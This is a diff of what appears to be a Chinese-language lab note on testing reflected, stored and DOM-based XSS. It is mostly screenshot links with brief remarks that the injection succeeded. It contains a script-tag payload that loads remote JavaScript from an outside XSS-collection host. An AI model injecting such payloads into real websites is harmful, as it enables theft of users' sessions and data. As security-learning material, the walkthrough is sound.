@@ -11,9 +11,12 @@
 
 
 ## 测试反射xss
+
 ```html
 <script src=http://xssye.com/laPM></script>
 ```
+
+
 将这条语句放入
 <img src="../pictures/atlstgyd7pk.png" width="600" />
 
@@ -22,3 +25,12 @@
 
 
 ## 测试存储xss
+<img src="../pictures/txfnwnnq22o.png" width="600" />
+查看结果,已经注入到页面了.
+<img src="../pictures/cy0ozsstmqh.png" width="600" />
+
+
+
+## DOM注入
+![image.png](../pictures/uso2hqlo5j.png)
+### 查看结果
